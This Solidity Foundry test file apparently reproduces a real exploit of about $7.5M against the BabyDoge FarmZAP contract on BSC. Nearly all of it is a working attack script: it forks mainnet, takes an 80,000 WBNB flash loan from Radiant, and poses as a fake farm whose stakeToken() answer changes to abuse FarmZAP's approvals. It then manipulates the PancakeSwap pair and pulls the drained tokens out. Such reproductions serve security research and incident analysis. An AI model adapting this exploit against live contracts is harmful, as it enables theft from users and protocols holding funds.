// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~7.5M USD$
// Attacker : https://bscscan.com/address/0xcbc0d0c1049eb011d7c7cfc4ff556d281f0afebb
// Attack Contract : https://bscscan.com/address/0x51873a0b615a51115f2cfbc2e24d9db4bfa2e6e2
// Vulnerable Contract : https://bscscan.com/address/0xc748673057861a797275cd8a068abb95a902e8de
// Attack Tx : https://bscscan.com/tx/0x098e7394a1733320e0887f0de22b18f5c71ee18d48a0f6d30c76890fb5c85375

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xc748673057861a797275cd8a068abb95a902e8de#code

// @Analysis
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1662744426475831298

interface IFarm {
    function depositOnBehalf(uint256 amount, address account) external;
    function stakeToken() external returns (address);
}

interface IFarmZAP {
    function buyTokensAndDepositOnBehalf(
        IFarm farm,
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path
    ) external payable returns (uint256);
}

contract ContractTest is Test {
    IERC20 BABYDOGE = IERC20(0xc748673057861a797275CD8A068AbB95A902e8de);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0);
    IFarmZAP FarmZAP = IFarmZAP(0x451583B6DA479eAA04366443262848e27706f762);
    IAaveFlashloan Radiant = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
    uint256 i;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_593_354);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(BABYDOGE), "BABYDOGE");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(FarmZAP), "FarmZAP");
        cheats.label(address(Radiant), "Radiant");
    }

    function testExploit() external {
        deal(address(this), 0);
        address[] memory assets = new address[](1);
        assets[0] = address(WBNB);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 * 1e18;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(0), 0);

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WBNB.approve(address(Radiant), amounts[0] + premiums[0]);
        WBNB.withdraw(80_000 * 1e18);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BABYDOGE);
        FarmZAP.buyTokensAndDepositOnBehalf{value: 80_000 ether}(IFarm(address(this)), 80_000 * 1e18, 0, path);
        BABYDOGEToWBNBInPancake();
        BABYDOGE.transferFrom(address(FarmZAP), address(BABYDOGE), BABYDOGE.balanceOf(address(FarmZAP)) - 1);
        BABYDOGE.transferFrom(address(FarmZAP), address(this), 1); // tigger sell BABYDOGECOIN and addLiquidity in pancakeSwap
        WBNBToBABYDOGEInPancake();
        WBNB.withdraw(0.001 ether);
        FarmZAP.buyTokensAndDepositOnBehalf{value: 0.001 ether}(IFarm(address(this)), 1e15, 0, path);
        BABYDOGEToWBNBInFarmZAP();
        return true;
    }

    function BABYDOGEToWBNBInPancake() internal {
        (uint256 WBNBReserve, uint256 BABYReserve,) = Pair.getReserves();
        BABYDOGE.transferFrom(address(FarmZAP), address(Pair), BABYReserve * 769 / 1000);
        uint256 amountIn = BABYDOGE.balanceOf(address(Pair)) - BABYReserve;
        uint256 amountOut = (9975 * amountIn * WBNBReserve) / (10_000 * BABYReserve + 9975 * amountIn);
        Pair.swap(amountOut, 0, address(this), new bytes(0));
    }

    function WBNBToBABYDOGEInPancake() internal {
        (uint256 WBNBReserve, uint256 BABYReserve,) = Pair.getReserves();
        WBNB.transfer(address(Pair), WBNBReserve * 767 / 1000);
        uint256 amountIn = WBNB.balanceOf(address(Pair)) - WBNBReserve;
        uint256 amountOut = (9975 * amountIn * BABYReserve) / (10_000 * WBNBReserve + 9975 * amountIn);
        Pair.swap(0, amountOut, address(FarmZAP), new bytes(0));
    }

    function BABYDOGEToWBNBInFarmZAP() internal {
        BABYDOGE.transferFrom(address(FarmZAP), address(this), BABYDOGE.balanceOf(address(FarmZAP)));
        BABYDOGE.approve(address(FarmZAP), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BABYDOGE);
        path[1] = address(WBNB);
        FarmZAP.buyTokensAndDepositOnBehalf(IFarm(address(this)), BABYDOGE.balanceOf(address(this)), 0, path);
        WBNB.transferFrom(address(FarmZAP), address(this), WBNB.balanceOf(address(FarmZAP)));
    }

    receive() external payable {}

    function depositOnBehalf(uint256 amount, address account) external {}

    function stakeToken() external returns (address) {
        i++;
        if (i != 3) {
            return address(BABYDOGE);
        } else {
            return address(WBNB);
        }
    }
}
